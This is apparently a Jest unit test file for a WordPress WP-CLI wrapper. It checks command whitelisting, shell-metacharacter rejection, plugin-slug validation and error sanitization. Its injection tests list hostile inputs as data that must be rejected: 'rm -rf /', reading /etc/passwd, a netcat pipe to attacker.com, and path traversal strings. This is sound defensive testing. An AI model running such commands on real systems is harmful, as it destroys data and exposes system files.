/**
 * Unit tests for WpCliManager
 * Tests command validation, security, and WP-CLI operations
 */

import { WpCliManager } from '../../src/lib/wordpress/WpCliManager';

describe('WpCliManager', () => {
  let wpCliManager: WpCliManager;

  beforeEach(() => {
    wpCliManager = new WpCliManager();
  });

  describe('Command Validation', () => {
    describe('Allowed Commands', () => {
      it('should allow whitelisted commands', () => {
        const allowedCommands = ['plugin', 'option', 'user', 'post', 'db', 'cache', 'rewrite', 'theme'];

        allowedCommands.forEach(command => {
          // @ts-ignore - accessing private method for testing
          const result = wpCliManager['validateCommand'](command, []);
          expect(result.valid).toBe(true);
        });
      });

      it('should reject non-whitelisted commands', () => {
        const disallowedCommands = ['eval', 'core', 'scaffold', 'import', 'export'];

        disallowedCommands.forEach(command => {
          // @ts-ignore - accessing private method for testing
          const result = wpCliManager['validateCommand'](command, []);
          expect(result.valid).toBe(false);
          expect(result.error).toContain('not allowed');
        });
      });
    });

    describe('Plugin Subcommands', () => {
      it('should allow whitelisted plugin subcommands', () => {
        const allowedSubcommands = [
          'list', 'status', 'activate', 'deactivate', 'delete',
          'get', 'install', 'is-installed', 'path', 'search',
          'toggle', 'uninstall', 'update'
        ];

        allowedSubcommands.forEach(subcommand => {
          // @ts-ignore - accessing private method for testing
          const result = wpCliManager['validateCommand']('plugin', [subcommand]);
          expect(result.valid).toBe(true);
        });
      });

      it('should reject non-whitelisted plugin subcommands', () => {
        const disallowedSubcommands = ['verify-checksums', 'auto-update'];

        disallowedSubcommands.forEach(subcommand => {
          // @ts-ignore - accessing private method for testing
          const result = wpCliManager['validateCommand']('plugin', [subcommand]);
          expect(result.valid).toBe(false);
          expect(result.error).toContain('not allowed');
        });
      });
    });

    describe('Shell Metacharacters - Security', () => {
      it('should reject arguments with shell metacharacters', () => {
        const dangerousChars = [';', '&', '|', '`', '$', '(', ')', '<', '>', '\\', '"', "'"];

        dangerousChars.forEach(char => {
          // @ts-ignore - accessing private method for testing
          const result = wpCliManager['validateCommand']('plugin', [`test${char}value`]);
          expect(result.valid).toBe(false);
          expect(result.error).toContain('invalid characters');
        });
      });

      it('should allow safe arguments', () => {
        const safeArgs = ['my-plugin', 'plugin_name', 'plugin.name', 'plugin123', 'PLUGIN'];

        safeArgs.forEach(arg => {
          // @ts-ignore - accessing private method for testing
          const result = wpCliManager['validateCommand']('plugin', ['list', arg]);
          expect(result.valid).toBe(true);
        });
      });
    });

    describe('Command Injection Prevention', () => {
      it('should reject command injection attempts', () => {
        const injectionAttempts = [
          '; rm -rf /',
          '&& cat /etc/passwd',
          '| nc attacker.com 1234',
          '`whoami`',
          '$(ls -la)',
          '; DROP TABLE users;'
        ];

        injectionAttempts.forEach(injection => {
          // @ts-ignore - accessing private method for testing
          const result = wpCliManager['validateCommand']('plugin', [injection]);
          expect(result.valid).toBe(false);
        });
      });
    });
  });

  describe('Plugin Slug Validation', () => {
    it('should accept valid plugin slugs', () => {
      const validSlugs = [
        'my-plugin',
        'plugin_name',
        'plugin-123',
        'test_plugin_2',
        'a',
        'plugin-with-many-hyphens-and-underscores_123'
      ];

      validSlugs.forEach(slug => {
        // @ts-ignore - accessing private method for testing
        const result = wpCliManager['isValidPluginSlug'](slug);
        expect(result).toBe(true);
      });
    });

    it('should reject invalid plugin slugs', () => {
      const invalidSlugs = [
        '',                          // Empty
        'a'.repeat(201),            // Too long
        'plugin name',              // Space
        'plugin@name',              // Special char
        'plugin/path',              // Slash
        '../plugin',                // Path traversal
        'plugin\\name',             // Backslash
        'plugin;name',              // Semicolon
        'PLUGIN-NAME'               // Only lowercase allowed in this test context
      ];

      invalidSlugs.forEach(slug => {
        // @ts-ignore - accessing private method for testing
        const result = wpCliManager['isValidPluginSlug'](slug);
        expect(result).toBe(false);
      });
    });

    it('should reject path traversal attempts in slugs', () => {
      const traversalAttempts = [
        '../',
        '../../etc/passwd',
        './../plugin',
        'plugin/../../../etc'
      ];

      traversalAttempts.forEach(slug => {
        // @ts-ignore - accessing private method for testing
        const result = wpCliManager['isValidPluginSlug'](slug);
        expect(result).toBe(false);
      });
    });
  });

  describe('Error Sanitization', () => {
    it('should sanitize user paths from error messages', () => {
      const errors = [
        new Error('/Users/john/site/file.php not found'),
        new Error('/home/jane/wordpress/error'),
        new Error('C:\\Users\\Bob\\site\\plugin.php failed')
      ];

      errors.forEach(error => {
        // @ts-ignore - accessing private method for testing
        const sanitized = wpCliManager['sanitizeError'](error);
        expect(sanitized).not.toContain('/Users/john');
        expect(sanitized).not.toContain('/home/jane');
        expect(sanitized).not.toContain('C:\\Users\\Bob');
        expect(sanitized).toContain('[USER]');
      });
    });

    it('should sanitize credentials from error messages', () => {
      const errors = [
        new Error('Connection failed for user:password@host'),
        new Error('Auth failed with token=abc123def456')
      ];

      errors.forEach(error => {
        // @ts-ignore - accessing private method for testing
        const sanitized = wpCliManager['sanitizeError'](error);
        expect(sanitized).not.toContain('password');
        expect(sanitized).not.toContain('abc123def456');
        expect(sanitized).toContain('[REDACTED]');
      });
    });

    it('should provide user-friendly error messages', () => {
      const testCases = [
        { error: new Error('Could not resolve host'), expected: 'Repository not found or network error' },
        { error: new Error('authentication failed'), expected: 'Authentication failed' },
        { error: new Error('already exists'), expected: 'Target directory already exists' }
      ];

      testCases.forEach(({ error, expected }) => {
        // @ts-ignore - accessing private method for testing
        const sanitized = wpCliManager['sanitizeError'](error);
        expect(sanitized.toLowerCase()).toContain(expected.toLowerCase());
      });
    });
  });

  describe('Security Edge Cases', () => {
    it('should handle null and undefined inputs safely', () => {
      // @ts-ignore - testing invalid inputs
      expect(wpCliManager['validateCommand'](null, [])).toEqual({ valid: false, error: expect.any(String) });

      // @ts-ignore - testing invalid inputs
      expect(wpCliManager['validateCommand']('plugin', null)).toEqual({ valid: false, error: expect.any(String) });

      // @ts-ignore - testing invalid inputs
      expect(wpCliManager['isValidPluginSlug'](null)).toBe(false);

      // @ts-ignore - testing invalid inputs
      expect(wpCliManager['isValidPluginSlug'](undefined)).toBe(false);
    });

    it('should handle very long inputs safely', () => {
      const longString = 'a'.repeat(10000);

      // Should not crash
      // @ts-ignore - accessing private method for testing
      const result = wpCliManager['isValidPluginSlug'](longString);
      expect(result).toBe(false);
    });

    it('should reject null bytes in arguments', () => {
      const argsWithNullBytes = [
        'plugin\0name',
        'test\x00value',
        'arg\u0000ument'
      ];

      argsWithNullBytes.forEach(arg => {
        // @ts-ignore - accessing private method for testing
        const result = wpCliManager['validateCommand']('plugin', [arg]);
        // Null bytes should be caught as invalid characters
        expect(result.valid).toBe(false);
      });
    });
  });

  describe('WP-CLI Path Resolution', () => {
    it('should cache resolved WP-CLI path', async () => {
      // @ts-ignore - accessing private property
      wpCliManager['wpCliPath'] = '/test/path/to/wp';

      // @ts-ignore - accessing private method
      const path = await wpCliManager['resolveWpCliPath']();

      expect(path).toBe('/test/path/to/wp');
    });

    it('should return null if no WP-CLI binary found', async () => {
      // Reset cached path
      // @ts-ignore - accessing private property
      wpCliManager['wpCliPath'] = null;

      // This will check actual file system, which likely won't have WP-CLI
      // in the test environment
      // @ts-ignore - accessing private method
      const path = await wpCliManager['resolveWpCliPath']();

      // In CI/test environment, this should be null or 'wp' (system PATH)
      expect(path === null || path === 'wp').toBe(true);
    });
  });
});
